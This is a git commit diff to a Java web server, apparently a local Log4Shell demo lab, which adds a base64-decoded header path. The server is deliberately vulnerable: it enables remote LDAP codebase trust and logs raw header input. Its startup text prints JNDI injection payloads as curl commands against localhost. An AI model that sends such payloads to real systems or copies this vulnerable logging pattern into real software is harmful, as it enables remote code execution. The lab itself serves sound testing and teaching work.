7ad34383029f02041757cab619897611f32b6039
Walter Szewelanczyk <walterszewelanczyk@gmail.com>
2021-12-31 06:44:10 -0500

    added the ability to send a base64 encoded header to the client web server

--- clients/src/main/java/Log4jWebServer.java
+++ clients/src/main/java/Log4jWebServer.java
@@ -3,7 +3,7 @@
 import java.io.IOException;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
-import java.util.Map;
+import java.util.Base64;
 
 import com.sun.net.httpserver.HttpExchange;
 import com.sun.net.httpserver.HttpHandler;
@@ -23,6 +23,15 @@ public class Log4jWebServer {
     System.out.println("You can call it using curl. Depending on your terminal you ");
     System.out.println("may need to escape the string :");
     System.out.println("curl -H 'log_me: ${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}' http://127.0.0.1:8888/");
+    System.out.println("");
+    System.out.println("If the log_me header is not found it will look for a log_me_b64");
+    System.out.println("header and do a base 64 decode prior to logging.");
+    System.out.println("The above log_me curl example would look like : ");
+    System.out.println("curl -H 'log_me_b64: JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS8jTU1fMTI3XzBfMF8xXzQ0NDR9Cg==' http://127.0.0.1:8888/");
+    System.out.println("");
+    System.out.println("On a linux system with base64 installed you can also use : ");
+    System.out.println("curl -H \"log_me_b64: `echo '${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}' | base64`\" http://127.0.0.1:8888/");
+    System.out.println("");
 
     int port = 8888;
     if(args.length > 0){
@@ -42,19 +51,31 @@ public class Log4jWebServer {
     private static final Logger logger = LogManager.getLogger(Log4jWebServer.class);
     @Override
     public void handle(HttpExchange t) throws IOException {
-      // Logging IP address of request to stdout
-      System.out.println("Request received from: " + t.getRemoteAddress().toString());
+      System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
+
+      String ip = t.getRemoteAddress().toString(); 
+      System.out.println("Request received from: " + ip);
 
       String log_me = t.getRequestHeaders().getFirst("log_me");
+      String log_me_b64 = t.getRequestHeaders().getFirst("log_me_b64");
 
       String response = "<html><body><h1>Please do not host this on a public computer!!!!</h1>\n";
-      if(log_me == null){
-        response += "<H3>No logs were written.  Please see the startup output for how to enable logs.</H3>";
+      if( (log_me == null) && (log_me_b64 == null) ){
+        response += "<h3>No logs were written.  Please see the startup output for how to enable logs.</h3>";
+      }
+      else if (log_me != null){
+        response += "<h3>Your log_me header was : "+log_me+"</h3>";
+        this.logger.error(""+ip+" : "+log_me);
       }
       else{
-        response += "<H3>Your log_me header was : ("+log_me+")</H3>";
-        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
-        this.logger.error(log_me);
+        response += "<h3>Your log_me_b64 header was : "+log_me_b64+"</h3>";
+        try{
+          String log_me_decoded = new String(Base64.getDecoder().decode(log_me_b64));
+          response += "<h3>Your decoded header was : "+log_me_decoded+"</h3>";
+          this.logger.error(""+ip+" : "+log_me_decoded);
+        }catch(Exception ex){
+        response += "<h3>There was an error decoding your msg.  Nothing was logged.</h3>";
+        }
       }
       response += "</body></html>\n";
 
